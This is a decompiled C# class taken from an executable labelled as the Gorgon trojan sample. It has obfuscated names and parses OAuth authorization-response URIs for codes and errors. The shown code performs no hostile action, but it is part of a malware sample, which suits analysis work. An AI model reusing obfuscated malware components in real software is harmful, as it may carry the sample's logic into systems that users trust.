// Decompiled with JetBrains decompiler
// Type: lqWc8fBl1n0fS.n1IcPKd2Lx0L1
// Assembly: Udby4Jt48oXkJ, Version=3.17.2.31, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 37899E89-D673-4F5B-A193-2E4DF6A54096
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-bf535869266eca7a958714acade2ede1bff0e73f0aaa2702f389ededee6a8d6a.exe

using \u0036mHL90hQ651VX;
using LsuEmqhbehFHp;
using mhZ8amQVr4JAO;
using System;
using System.Collections.Generic;
using System.Runtime.Serialization;

namespace lqWc8fBl1n0fS
{
  [DataContract]
  public class n1IcPKd2Lx0L1
  {
    public n1IcPKd2Lx0L1()
    {
    }

    internal n1IcPKd2Lx0L1(\u0034Q4kewdu41N7r status) => this.\u0030u066mBCu3Bz5 = status;

    internal n1IcPKd2Lx0L1(\u0034Q4kewdu41N7r status, string returnedUriInput)
      : this(status)
    {
      if (this.\u0030u066mBCu3Bz5 == \u0034Q4kewdu41N7r.UserCancel)
      {
        this.KdtiJYBG0jHNl = "authentication_canceled";
        this.whPlA9q7S8MfE = "User canceled authentication";
      }
      else if (this.\u0030u066mBCu3Bz5 == \u0034Q4kewdu41N7r.UnknownError)
      {
        this.KdtiJYBG0jHNl = "unknown_error";
        this.whPlA9q7S8MfE = "Unknown error";
      }
      else
        this.tGET3Pr80JvEM(returnedUriInput);
    }

    [DataMember]
    public \u0034Q4kewdu41N7r \u0030u066mBCu3Bz5 { get; private set; }

    [DataMember]
    public string \u0035FsVRq3WDJGR0 { get; private set; }

    [DataMember]
    public string KdtiJYBG0jHNl { get; set; }

    [DataMember]
    public string whPlA9q7S8MfE { get; set; }

    [DataMember]
    public string K15QZnSjGC1fp { get; set; }

    public void tGET3Pr80JvEM(string VvogkFHGupIPw)
    {
      string query = new Uri(VvogkFHGupIPw).Query;
      if (!string.IsNullOrWhiteSpace(query))
      {
        Dictionary<string, string> dictionary = \u0037BKomckZ2VHww.vvzmwqlHCT7Qk(query.Substring(1), '&', true, (Up2ciG6wVdM5T) null);
        if (dictionary.ContainsKey("code"))
          this.\u0035FsVRq3WDJGR0 = dictionary["code"];
        else if (VvogkFHGupIPw.StartsWith("msauth://", StringComparison.OrdinalIgnoreCase))
          this.\u0035FsVRq3WDJGR0 = VvogkFHGupIPw;
        else if (dictionary.ContainsKey("error"))
        {
          this.KdtiJYBG0jHNl = dictionary["error"];
          this.whPlA9q7S8MfE = dictionary.ContainsKey("error_description") ? dictionary["error_description"] : (string) null;
          this.\u0030u066mBCu3Bz5 = \u0034Q4kewdu41N7r.ProtocolError;
        }
        else
        {
          this.KdtiJYBG0jHNl = "authentication_failed";
          this.whPlA9q7S8MfE = "The authorization server returned an invalid response";
          this.\u0030u066mBCu3Bz5 = \u0034Q4kewdu41N7r.UnknownError;
        }
        if (!dictionary.ContainsKey("cloud_instance_host_name"))
          return;
        this.K15QZnSjGC1fp = dictionary["cloud_instance_host_name"];
      }
      else
      {
        this.KdtiJYBG0jHNl = "authentication_failed";
        this.whPlA9q7S8MfE = "The authorization server returned an invalid response";
        this.\u0030u066mBCu3Bz5 = \u0034Q4kewdu41N7r.UnknownError;
      }
    }
  }
}
